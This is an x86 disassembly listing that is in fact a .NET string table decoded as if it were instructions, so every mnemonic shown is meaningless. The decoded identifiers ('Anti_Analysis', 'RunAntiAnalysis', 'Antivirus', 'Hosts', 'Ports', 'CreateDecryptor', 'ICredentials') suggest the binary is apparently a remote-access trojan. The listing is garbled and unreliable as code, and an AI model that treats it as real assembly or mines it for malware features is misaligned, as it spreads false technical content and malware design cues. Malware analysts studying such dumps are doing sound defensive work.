  408c73:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c77:	6e                   	outsb  %ds:(%esi),(%dx)
  408c78:	75 66                	jne    0x408ce0
  408c7a:	61                   	popa
  408c7b:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c7f:	65 72 00             	gs jb  0x408c82
  408c82:	43                   	inc    %ebx
  408c83:	75 72                	jne    0x408cf7
  408c85:	72 65                	jb     0x408cec
  408c87:	6e                   	outsb  %ds:(%esi),(%dx)
  408c88:	74 55                	je     0x408cdf
  408c8a:	73 65                	jae    0x408cf1
  408c8c:	72 00                	jb     0x408c8e
  408c8e:	53                   	push   %ebx
  408c8f:	74 72                	je     0x408d03
  408c91:	65 61                	gs popa
  408c93:	6d                   	insl   (%dx),%es:(%edi)
  408c94:	57                   	push   %edi
  408c95:	72 69                	jb     0x408d00
  408c97:	74 65                	je     0x408cfe
  408c99:	72 00                	jb     0x408c9b
  408c9b:	54                   	push   %esp
  408c9c:	65 78 74             	gs js  0x408d13
  408c9f:	57                   	push   %edi
  408ca0:	72 69                	jb     0x408d0b
  408ca2:	74 65                	je     0x408d09
  408ca4:	72 00                	jb     0x408ca6
  408ca6:	45                   	inc    %ebp
  408ca7:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca8:	74 65                	je     0x408d0f
  408caa:	72 00                	jb     0x408cac
  408cac:	42                   	inc    %edx
  408cad:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cb4:	72 
  408cb5:	74 65                	je     0x408d1c
  408cb7:	72 00                	jb     0x408cb9
  408cb9:	54                   	push   %esp
  408cba:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbb:	4c                   	dec    %esp
  408cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbd:	77 65                	ja     0x408d24
  408cbf:	72 00                	jb     0x408cc1
  408cc1:	45                   	inc    %ebp
  408cc2:	72 72                	jb     0x408d36
  408cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc5:	72 00                	jb     0x408cc7
  408cc7:	49                   	dec    %ecx
  408cc8:	45                   	inc    %ebp
  408cc9:	6e                   	outsb  %ds:(%esi),(%dx)
  408cca:	75 6d                	jne    0x408d39
  408ccc:	65 72 61             	gs jb  0x408d30
  408ccf:	74 6f                	je     0x408d40
  408cd1:	72 00                	jb     0x408cd3
  408cd3:	4d                   	dec    %ebp
  408cd4:	61                   	popa
  408cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd6:	61                   	popa
  408cd7:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cda:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cdc:	74 4f                	je     0x408d2d
  408cde:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ce1:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ce5:	75 6d                	jne    0x408d54
  408ce7:	65 72 61             	gs jb  0x408d4b
  408cea:	74 6f                	je     0x408d5b
  408cec:	72 00                	jb     0x408cee
  408cee:	53                   	push   %ebx
  408cef:	79 73                	jns    0x408d64
  408cf1:	74 65                	je     0x408d58
  408cf3:	6d                   	insl   (%dx),%es:(%edi)
  408cf4:	2e 43                	cs inc %ebx
  408cf6:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf7:	6c                   	insb   (%dx),%es:(%edi)
  408cf8:	6c                   	insb   (%dx),%es:(%edi)
  408cf9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cfe:	6e                   	outsb  %ds:(%esi),(%dx)
  408cff:	73 2e                	jae    0x408d2f
  408d01:	49                   	dec    %ecx
  408d02:	45                   	inc    %ebp
  408d03:	6e                   	outsb  %ds:(%esi),(%dx)
  408d04:	75 6d                	jne    0x408d73
  408d06:	65 72 61             	gs jb  0x408d6a
  408d09:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d0d:	47                   	inc    %edi
  408d0e:	65 74 45             	gs je  0x408d56
  408d11:	6e                   	outsb  %ds:(%esi),(%dx)
  408d12:	75 6d                	jne    0x408d81
  408d14:	65 72 61             	gs jb  0x408d78
  408d17:	74 6f                	je     0x408d88
  408d19:	72 00                	jb     0x408d1b
  408d1b:	41                   	inc    %ecx
  408d1c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d20:	61                   	popa
  408d21:	74 6f                	je     0x408d92
  408d23:	72 00                	jb     0x408d25
  408d25:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d2a:	00 2e                	add    %ch,(%esi)
  408d2c:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d30:	72 00                	jb     0x408d32
  408d32:	4d                   	dec    %ebp
  408d33:	6f                   	outsl  %ds:(%esi),(%dx)
  408d34:	6e                   	outsb  %ds:(%esi),(%dx)
  408d35:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d3c:	65 
  408d3d:	61                   	popa
  408d3e:	74 65                	je     0x408da5
  408d40:	44                   	inc    %esp
  408d41:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d45:	70 74                	jo     0x408dbb
  408d47:	6f                   	outsl  %ds:(%esi),(%dx)
  408d48:	72 00                	jb     0x408d4a
  408d4a:	43                   	inc    %ebx
  408d4b:	72 65                	jb     0x408db2
  408d4d:	61                   	popa
  408d4e:	74 65                	je     0x408db5
  408d50:	45                   	inc    %ebp
  408d51:	6e                   	outsb  %ds:(%esi),(%dx)
  408d52:	63 72 79             	arpl   %esi,0x79(%edx)
  408d55:	70 74                	jo     0x408dcb
  408d57:	6f                   	outsl  %ds:(%esi),(%dx)
  408d58:	72 00                	jb     0x408d5a
  408d5a:	49                   	dec    %ecx
  408d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5c:	74 50                	je     0x408dae
  408d5e:	74 72                	je     0x408dd2
  408d60:	00 53 79             	add    %dl,0x79(%ebx)
  408d63:	73 74                	jae    0x408dd9
  408d65:	65 6d                	gs insl (%dx),%es:(%edi)
  408d67:	2e 44                	cs inc %esp
  408d69:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d70:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d77:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7f:	64 73 00             	fs jae 0x408d82
  408d82:	4d                   	dec    %ebp
  408d83:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d8a:	74 2e                	je     0x408dba
  408d8c:	56                   	push   %esi
  408d8d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d94:	73 69                	jae    0x408dff
  408d96:	63 2e                	arpl   %ebp,(%esi)
  408d98:	44                   	inc    %esp
  408d99:	65 76 69             	gs jbe 0x408e05
  408d9c:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d9f:	00 53 79             	add    %dl,0x79(%ebx)
  408da2:	73 74                	jae    0x408e18
  408da4:	65 6d                	gs insl (%dx),%es:(%edi)
  408da6:	2e 52                	cs push %edx
  408da8:	75 6e                	jne    0x408e18
  408daa:	74 69                	je     0x408e15
  408dac:	6d                   	insl   (%dx),%es:(%edi)
  408dad:	65 2e 49             	gs cs dec %ecx
  408db0:	6e                   	outsb  %ds:(%esi),(%dx)
  408db1:	74 65                	je     0x408e18
  408db3:	72 6f                	jb     0x408e24
  408db5:	70 53                	jo     0x408e0a
  408db7:	65 72 76             	gs jb  0x408e30
  408dba:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dc1:	73 74                	jae    0x408e37
  408dc3:	65 6d                	gs insl (%dx),%es:(%edi)
  408dc5:	2e 52                	cs push %edx
  408dc7:	75 6e                	jne    0x408e37
  408dc9:	74 69                	je     0x408e34
  408dcb:	6d                   	insl   (%dx),%es:(%edi)
  408dcc:	65 2e 43             	gs cs inc %ebx
  408dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd0:	6d                   	insl   (%dx),%es:(%edi)
  408dd1:	70 69                	jo     0x408e3c
  408dd3:	6c                   	insb   (%dx),%es:(%edi)
  408dd4:	65 72 53             	gs jb  0x408e2a
  408dd7:	65 72 76             	gs jb  0x408e50
  408dda:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408de1:	62 75 67             	bound  %esi,0x67(%ebp)
  408de4:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408deb:	65 
  408dec:	73 00                	jae    0x408dee
  408dee:	45                   	inc    %ebp
  408def:	78 70                	js     0x408e61
  408df1:	61                   	popa
  408df2:	6e                   	outsb  %ds:(%esi),(%dx)
  408df3:	64 45                	fs inc %ebp
  408df5:	6e                   	outsb  %ds:(%esi),(%dx)
  408df6:	76 69                	jbe    0x408e61
  408df8:	72 6f                	jb     0x408e69
  408dfa:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfb:	6d                   	insl   (%dx),%es:(%edi)
  408dfc:	65 6e                	outsb  %gs:(%esi),(%dx)
  408dfe:	74 56                	je     0x408e56
  408e00:	61                   	popa
  408e01:	72 69                	jb     0x408e6c
  408e03:	61                   	popa
  408e04:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e08:	00 47 65             	add    %al,0x65(%edi)
  408e0b:	74 50                	je     0x408e5d
  408e0d:	72 6f                	jb     0x408e7e
  408e0f:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e12:	73 65                	jae    0x408e79
  408e14:	73 00                	jae    0x408e16
  408e16:	47                   	inc    %edi
  408e17:	65 74 48             	gs je  0x408e62
  408e1a:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1b:	73 74                	jae    0x408e91
  408e1d:	41                   	inc    %ecx
  408e1e:	64 64 72 65          	fs fs jb 0x408e87
  408e22:	73 73                	jae    0x408e97
  408e24:	65 73 00             	gs jae 0x408e27
  408e27:	53                   	push   %ebx
  408e28:	79 73                	jns    0x408e9d
  408e2a:	74 65                	je     0x408e91
  408e2c:	6d                   	insl   (%dx),%es:(%edi)
  408e2d:	2e 53                	cs push %ebx
  408e2f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e33:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e3a:	70 
  408e3b:	74 6f                	je     0x408eac
  408e3d:	67 72 61             	addr16 jb 0x408ea1
  408e40:	70 68                	jo     0x408eaa
  408e42:	79 2e                	jns    0x408e72
  408e44:	58                   	pop    %eax
  408e45:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e4a:	72 74                	jb     0x408ec0
  408e4c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e53:	73 00                	jae    0x408e55
  408e55:	45                   	inc    %ebp
  408e56:	6e                   	outsb  %ds:(%esi),(%dx)
  408e57:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e5a:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e5e:	74 65                	je     0x408ec5
  408e60:	73 00                	jae    0x408e62
  408e62:	47                   	inc    %edi
  408e63:	65 74 55             	gs je  0x408ebb
  408e66:	74 66                	je     0x408ece
  408e68:	38 42 79             	cmp    %al,0x79(%edx)
  408e6b:	74 65                	je     0x408ed2
  408e6d:	73 00                	jae    0x408e6f
  408e6f:	75 74                	jne    0x408ee5
  408e71:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e75:	74 65                	je     0x408edc
  408e77:	73 00                	jae    0x408e79
  408e79:	52                   	push   %edx
  408e7a:	66 63 32             	arpl   %si,(%edx)
  408e7d:	38 39                	cmp    %bh,(%ecx)
  408e7f:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e83:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e8a:	73 00                	jae    0x408e8c
  408e8c:	52                   	push   %edx
  408e8d:	65 61                	gs popa
  408e8f:	64 41                	fs inc %ecx
  408e91:	6c                   	insb   (%dx),%es:(%edi)
  408e92:	6c                   	insb   (%dx),%es:(%edi)
  408e93:	42                   	inc    %edx
  408e94:	79 74                	jns    0x408f0a
  408e96:	65 73 00             	gs jae 0x408e99
  408e99:	44                   	inc    %esp
  408e9a:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e9e:	65 46                	gs inc %esi
  408ea0:	72 6f                	jb     0x408f11
  408ea2:	6d                   	insl   (%dx),%es:(%edi)
  408ea3:	42                   	inc    %edx
  408ea4:	79 74                	jns    0x408f1a
  408ea6:	65 73 00             	gs jae 0x408ea9
  408ea9:	53                   	push   %ebx
  408eaa:	77 61                	ja     0x408f0d
  408eac:	70 42                	jo     0x408ef0
  408eae:	79 74                	jns    0x408f24
  408eb0:	65 73 00             	gs jae 0x408eb3
  408eb3:	4c                   	dec    %esp
  408eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb5:	61                   	popa
  408eb6:	64 46                	fs inc %esi
  408eb8:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ebf:	74 
  408ec0:	65 73 00             	gs jae 0x408ec3
  408ec3:	47                   	inc    %edi
  408ec4:	65 74 41             	gs je  0x408f08
  408ec7:	73 42                	jae    0x408f0b
  408ec9:	79 74                	jns    0x408f3f
  408ecb:	65 73 00             	gs jae 0x408ece
  408ece:	53                   	push   %ebx
  408ecf:	65 74 41             	gs je  0x408f13
  408ed2:	73 42                	jae    0x408f16
  408ed4:	79 74                	jns    0x408f4a
  408ed6:	65 73 00             	gs jae 0x408ed9
  408ed9:	47                   	inc    %edi
  408eda:	65 74 42             	gs je  0x408f1f
  408edd:	79 74                	jns    0x408f53
  408edf:	65 73 00             	gs jae 0x408ee2
  408ee2:	72 61                	jb     0x408f45
  408ee4:	77 42                	ja     0x408f28
  408ee6:	79 74                	jns    0x408f5c
  408ee8:	65 73 00             	gs jae 0x408eeb
  408eeb:	62 79 74             	bound  %edi,0x74(%ecx)
  408eee:	65 73 00             	gs jae 0x408ef1
  408ef1:	43                   	inc    %ebx
  408ef2:	53                   	push   %ebx
  408ef3:	68 61 72 70 41       	push   $0x41707261
  408ef8:	72 67                	jb     0x408f61
  408efa:	75 6d                	jne    0x408f69
  408efc:	65 6e                	outsb  %gs:(%esi),(%dx)
  408efe:	74 49                	je     0x408f49
  408f00:	6e                   	outsb  %ds:(%esi),(%dx)
  408f01:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f03:	46                   	inc    %esi
  408f04:	6c                   	insb   (%dx),%es:(%edi)
  408f05:	61                   	popa
  408f06:	67 73 00             	addr16 jae 0x408f09
  408f09:	43                   	inc    %ebx
  408f0a:	53                   	push   %ebx
  408f0b:	68 61 72 70 42       	push   $0x42707261
  408f10:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f17:	61                   	popa
  408f18:	67 73 00             	addr16 jae 0x408f1b
  408f1b:	65 73 46             	gs jae 0x408f64
  408f1e:	6c                   	insb   (%dx),%es:(%edi)
  408f1f:	61                   	popa
  408f20:	67 73 00             	addr16 jae 0x408f23
  408f23:	53                   	push   %ebx
  408f24:	74 72                	je     0x408f98
  408f26:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f2d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f34:	65 
  408f35:	53                   	push   %ebx
  408f36:	65 74 74             	gs je  0x408fad
  408f39:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f40:	73 73                	jae    0x408fb5
  408f42:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f49:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4a:	67 45                	addr16 inc %ebp
  408f4c:	76 65                	jbe    0x408fb3
  408f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4f:	74 41                	je     0x408f92
  408f51:	72 67                	jb     0x408fba
  408f53:	73 00                	jae    0x408f55
  408f55:	41                   	inc    %ecx
  408f56:	6e                   	outsb  %ds:(%esi),(%dx)
  408f57:	74 69                	je     0x408fc2
  408f59:	5f                   	pop    %edi
  408f5a:	41                   	inc    %ecx
  408f5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5c:	61                   	popa
  408f5d:	6c                   	insb   (%dx),%es:(%edi)
  408f5e:	79 73                	jns    0x408fd3
  408f60:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f67:	6e                   	outsb  %ds:(%esi),(%dx)
  408f68:	74 69                	je     0x408fd3
  408f6a:	41                   	inc    %ecx
  408f6b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6c:	61                   	popa
  408f6d:	6c                   	insb   (%dx),%es:(%edi)
  408f6e:	79 73                	jns    0x408fe3
  408f70:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f77:	73 00                	jae    0x408f79
  408f79:	49                   	dec    %ecx
  408f7a:	43                   	inc    %ebx
  408f7b:	72 65                	jb     0x408fe2
  408f7d:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f80:	74 69                	je     0x408feb
  408f82:	61                   	popa
  408f83:	6c                   	insb   (%dx),%es:(%edi)
  408f84:	73 00                	jae    0x408f86
  408f86:	73 65                	jae    0x408fed
  408f88:	74 5f                	je     0x408fe9
  408f8a:	43                   	inc    %ebx
  408f8b:	72 65                	jb     0x408ff2
  408f8d:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f90:	74 69                	je     0x408ffb
  408f92:	61                   	popa
  408f93:	6c                   	insb   (%dx),%es:(%edi)
  408f94:	73 00                	jae    0x408f96
  408f96:	45                   	inc    %ebp
  408f97:	71 75                	jno    0x40900e
  408f99:	61                   	popa
  408f9a:	6c                   	insb   (%dx),%es:(%edi)
  408f9b:	73 00                	jae    0x408f9d
  408f9d:	53                   	push   %ebx
  408f9e:	73 6c                	jae    0x40900c
  408fa0:	50                   	push   %eax
  408fa1:	72 6f                	jb     0x409012
  408fa3:	74 6f                	je     0x409014
  408fa5:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa8:	73 00                	jae    0x408faa
  408faa:	52                   	push   %edx
  408fab:	65 61                	gs popa
  408fad:	64 54                	fs push %esp
  408faf:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb1:	6c                   	insb   (%dx),%es:(%edi)
  408fb2:	73 00                	jae    0x408fb4
  408fb4:	57                   	push   %edi
  408fb5:	72 69                	jb     0x409020
  408fb7:	74 65                	je     0x40901e
  408fb9:	54                   	push   %esp
  408fba:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbb:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbc:	6c                   	insb   (%dx),%es:(%edi)
  408fbd:	73 00                	jae    0x408fbf
  408fbf:	42                   	inc    %edx
  408fc0:	79 74                	jns    0x409036
  408fc2:	65 73 54             	gs jae 0x409019
  408fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc6:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc7:	6c                   	insb   (%dx),%es:(%edi)
  408fc8:	73 00                	jae    0x408fca
  408fca:	53                   	push   %ebx
  408fcb:	79 73                	jns    0x409040
  408fcd:	74 65                	je     0x409034
  408fcf:	6d                   	insl   (%dx),%es:(%edi)
  408fd0:	2e 57                	cs push %edi
  408fd2:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd9:	46                   	inc    %esi
  408fda:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdb:	72 6d                	jb     0x40904a
  408fdd:	73 00                	jae    0x408fdf
  408fdf:	44                   	inc    %esp
  408fe0:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe1:	73 00                	jae    0x408fe3
  408fe3:	43                   	inc    %ebx
  408fe4:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe5:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe6:	74 61                	je     0x409049
  408fe8:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fef:	74 65                	je     0x409056
  408ff1:	6d                   	insl   (%dx),%es:(%edi)
  408ff2:	2e 43                	cs inc %ebx
  408ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff5:	6c                   	insb   (%dx),%es:(%edi)
  408ff6:	6c                   	insb   (%dx),%es:(%edi)
  408ff7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ffc:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffd:	73 00                	jae    0x408fff
  408fff:	53                   	push   %ebx
  409000:	74 72                	je     0x409074
  409002:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409009:	74 4f                	je     0x40905a
  40900b:	70 74                	jo     0x409081
  40900d:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409014:	74 49                	je     0x40905f
  409016:	6d                   	insl   (%dx),%es:(%edi)
  409017:	61                   	popa
  409018:	67 65 44             	addr16 gs inc %esp
  40901b:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40901f:	65 72 73             	gs jb  0x409095
  409022:	00 52 75             	add    %dl,0x75(%edx)
  409025:	6e                   	outsb  %ds:(%esi),(%dx)
  409026:	74 69                	je     0x409091
  409028:	6d                   	insl   (%dx),%es:(%edi)
  409029:	65 48                	gs dec %eax
  40902b:	65 6c                	gs insb (%dx),%es:(%edi)
  40902d:	70 65                	jo     0x409094
  40902f:	72 73                	jb     0x4090a4
  409031:	00 53 73             	add    %dl,0x73(%ebx)
  409034:	6c                   	insb   (%dx),%es:(%edi)
  409035:	50                   	push   %eax
  409036:	6f                   	outsl  %ds:(%esi),(%dx)
  409037:	6c                   	insb   (%dx),%es:(%edi)
  409038:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40903f:	72 73                	jb     0x4090b4
  409041:	00 73 73             	add    %dh,0x73(%ebx)
  409044:	6c                   	insb   (%dx),%es:(%edi)
  409045:	50                   	push   %eax
  409046:	6f                   	outsl  %ds:(%esi),(%dx)
  409047:	6c                   	insb   (%dx),%es:(%edi)
  409048:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40904f:	72 73                	jb     0x4090c4
  409051:	00 46 69             	add    %al,0x69(%esi)
  409054:	6c                   	insb   (%dx),%es:(%edi)
  409055:	65 41                	gs inc %ecx
  409057:	63 63 65             	arpl   %esp,0x65(%ebx)
  40905a:	73 73                	jae    0x4090cf
  40905c:	00 68 50             	add    %ch,0x50(%eax)
  40905f:	72 6f                	jb     0x4090d0
  409061:	63 65 73             	arpl   %esp,0x73(%ebp)
  409064:	73 00                	jae    0x409066
  409066:	47                   	inc    %edi
  409067:	65 74 43             	gs je  0x4090ad
  40906a:	75 72                	jne    0x4090de
  40906c:	72 65                	jb     0x4090d3
  40906e:	6e                   	outsb  %ds:(%esi),(%dx)
  40906f:	74 50                	je     0x4090c1
  409071:	72 6f                	jb     0x4090e2
  409073:	63 65 73             	arpl   %esp,0x73(%ebp)
  409076:	73 00                	jae    0x409078
  409078:	49                   	dec    %ecx
  409079:	50                   	push   %eax
  40907a:	41                   	inc    %ecx
  40907b:	64 64 72 65          	fs fs jb 0x4090e4
  40907f:	73 73                	jae    0x4090f4
  409081:	00 43 6f             	add    %al,0x6f(%ebx)
  409084:	6d                   	insl   (%dx),%es:(%edi)
  409085:	70 72                	jo     0x4090f9
  409087:	65 73 73             	gs jae 0x4090fd
  40908a:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40908e:	6f                   	outsl  %ds:(%esi),(%dx)
  40908f:	6d                   	insl   (%dx),%es:(%edi)
  409090:	70 72                	jo     0x409104
  409092:	65 73 73             	gs jae 0x409108
  409095:	00 53 79             	add    %dl,0x79(%ebx)
  409098:	73 74                	jae    0x40910e
  40909a:	65 6d                	gs insl (%dx),%es:(%edi)
  40909c:	2e 4e                	cs dec %esi
  40909e:	65 74 2e             	gs je  0x4090cf
  4090a1:	53                   	push   %ebx
  4090a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090a6:	74 73                	je     0x40911b
  4090a8:	00 73 65             	add    %dh,0x65(%ebx)
  4090ab:	74 5f                	je     0x40910c
  4090ad:	41                   	inc    %ecx
  4090ae:	72 67                	jb     0x409117
  4090b0:	75 6d                	jne    0x40911f
  4090b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b4:	74 73                	je     0x409129
  4090b6:	00 53 79             	add    %dl,0x79(%ebx)
  4090b9:	73 74                	jae    0x40912f
  4090bb:	65 6d                	gs insl (%dx),%es:(%edi)
  4090bd:	45                   	inc    %ebp
  4090be:	76 65                	jbe    0x409125
  4090c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c1:	74 73                	je     0x409136
  4090c3:	00 50 6f             	add    %dl,0x6f(%eax)
  4090c6:	72 74                	jb     0x40913c
  4090c8:	73 00                	jae    0x4090ca
  4090ca:	45                   	inc    %ebp
  4090cb:	78 69                	js     0x409136
  4090cd:	73 74                	jae    0x409143
  4090cf:	73 00                	jae    0x4090d1
  4090d1:	48                   	dec    %eax
  4090d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d3:	73 74                	jae    0x409149
  4090d5:	73 00                	jae    0x4090d7
  4090d7:	41                   	inc    %ecx
  4090d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d9:	74 69                	je     0x409144
  4090db:	76 69                	jbe    0x409146
  4090dd:	72 75                	jb     0x409154
  4090df:	73 00                	jae    0x4090e1
  4090e1:	43                   	inc    %ebx
  4090e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e4:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090e7:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090ea:	61                   	popa
  4090eb:	67 65 46             	addr16 gs inc %esi
  4090ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ef:	72 6d                	jb     0x40915e
  4090f1:	61                   	popa
  4090f2:	74 00                	je     0x4090f4
  4090f4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090f6:	72 6d                	jb     0x409165
  4090f8:	61                   	popa
  4090f9:	74 00                	je     0x4090fb
  4090fb:	57                   	push   %edi
  4090fc:	72 69                	jb     0x409167
  4090fe:	74 65                	je     0x409165
  409100:	46                   	inc    %esi
  409101:	6c                   	insb   (%dx),%es:(%edi)
  409102:	6f                   	outsl  %ds:(%esi),(%dx)
  409103:	61                   	popa
  409104:	74 00                	je     0x409106
  409106:	67 65 74 5f          	addr16 gs je 0x409169
  40910a:	41                   	inc    %ecx
  40910b:	73 46                	jae    0x409153
  40910d:	6c                   	insb   (%dx),%es:(%edi)
  40910e:	6f                   	outsl  %ds:(%esi),(%dx)
  40910f:	61                   	popa
  409110:	74 00                	je     0x409112
  409112:	73 65                	jae    0x409179
  409114:	74 5f                	je     0x409175
  409116:	41                   	inc    %ecx
  409117:	73 46                	jae    0x40915f
  409119:	6c                   	insb   (%dx),%es:(%edi)
  40911a:	6f                   	outsl  %ds:(%esi),(%dx)
  40911b:	61                   	popa
  40911c:	74 00                	je     0x40911e
  40911e:	47                   	inc    %edi
  40911f:	65 74 41             	gs je  0x409163
  409122:	73 46                	jae    0x40916a
  409124:	6c                   	insb   (%dx),%es:(%edi)
  409125:	6f                   	outsl  %ds:(%esi),(%dx)
  409126:	61                   	popa
  409127:	74 00                	je     0x409129
  409129:	53                   	push   %ebx
  40912a:	65 74 41             	gs je  0x40916e
  40912d:	73 46                	jae    0x409175
  40912f:	6c                   	insb   (%dx),%es:(%edi)
  409130:	6f                   	outsl  %ds:(%esi),(%dx)
  409131:	61                   	popa
  409132:	74 00                	je     0x409134
  409134:	46                   	inc    %esi
  409135:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  40913c:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409140:	61                   	popa
  409141:	6e                   	outsb  %ds:(%esi),(%dx)
  409142:	61                   	popa
  409143:	67 65 6d             	gs insl (%dx),%es:(%di)
  409146:	65 6e                	outsb  %gs:(%esi),(%dx)
  409148:	74 42                	je     0x40918c
  40914a:	61                   	popa
  40914b:	73 65                	jae    0x4091b2
  40914d:	4f                   	dec    %edi
  40914e:	62 6a 65             	bound  %ebp,0x65(%edx)
  409151:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409155:	6f                   	outsl  %ds:(%esi),(%dx)
  409156:	72 63                	jb     0x4091bb
  409158:	65 50                	gs push %eax
  40915a:	61                   	popa
  40915b:	74 68                	je     0x4091c5
  40915d:	4f                   	dec    %edi
  40915e:	62 6a 65             	bound  %ebp,0x65(%edx)
  409161:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409165:	6f                   	outsl  %ds:(%esi),(%dx)
  409166:	6c                   	insb   (%dx),%es:(%edi)
  409167:	6c                   	insb   (%dx),%es:(%edi)
  409168:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40916d:	6f                   	outsl  %ds:(%esi),(%dx)
  40916e:	6e                   	outsb  %ds:(%esi),(%dx)
